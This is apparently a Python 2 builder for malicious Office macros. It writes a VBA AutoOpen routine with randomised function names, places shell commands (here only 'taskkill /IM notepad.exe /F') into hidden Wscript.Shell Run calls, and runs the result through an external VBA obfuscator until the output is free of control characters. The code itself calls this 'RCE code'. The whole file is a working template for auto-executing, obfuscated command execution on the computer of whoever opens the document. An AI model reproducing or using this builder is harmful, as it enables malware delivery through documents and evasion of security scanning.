import string
import random

SHELL_SCRIPT = '''

taskkill /IM notepad.exe /F

'''



# Random names for vba functions
RND_coverture       = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits
RND_Worker          = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits
RND_BuildFullPath   = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits


vba = '''
Sub AutoOpen()

    ''' + RND_Worker + '''
    ''' + RND_coverture + '''
    
End Sub

Sub ''' + RND_coverture + '''()
    
    MsgBox "DONE"
    
End Sub

Sub ''' + RND_Worker + '''()

    On Error Resume Next

    Set oShell = CreateObject("Wscript.Shell")
    
'''


import subprocess
import os

try:
    os.remove ('plain_vba.txt')
    os.remove ('obfuscated_vba.txt')
except:
    pass

##########################################################################################

vba_obfuscator_name = 'vba_obfuscator_ex.py'    # Usage: python vba_obfuscator.py inFile.vba outFile.vba
max_line_lenght = 128

# Insert RCE code in plain vba
f = open('plain_vba.txt', 'w')
f.write(vba)

c = 1
for l in SHELL_SCRIPT.split("\n"):
    if len(l) > 1:
        f.write('    Dim cccc' + str(c) + '\n')
        f.write('    cccc' + str(c) + ' = "' + l.replace('\"', '\" & Chr(34) & \"') + '"\n')
        f.write('    oShell.Run ' + 'cccc' + str(c) + ', 0, False' + '\n\n')
        c += 1

f.write("End Sub")
f.close()


##########################################################################################

# Function to check the presence of ASCII character
def is_ascii(s):

    unallowed = [
                    0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 14, 15, 16, 17, 
                    18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31
                ]

    for a in unallowed:
        check = all( a != ord(c) < 127 for c in s )

        if check == False:
            return False

    if check:
        return True

##########################################################################################

build_status = False
while build_status == False:

    # Obfuscating plain vba
    subprocess.call ( ['python', vba_obfuscator_name, 'plain_vba.txt', 'obfuscated_vba.txt'])


    # Check for control ASCII character in obfuscated vba
    f = open('obfuscated_vba.txt', 'r') 
    OBF_vba = f.read()
    f.close()

    build_status = is_ascii (OBF_vba)

    if build_status == False:
        raw_input ("[!] Found control ASCII character. Press enter to retry...")
    
    else:
        print "[*] ALL GOOD, cleaning up..."

##########################################################################################

try:
    pass
    os.remove ('plain_vba.txt')
    #os.remove ('obfuscated_vba.txt')
except:
    pass


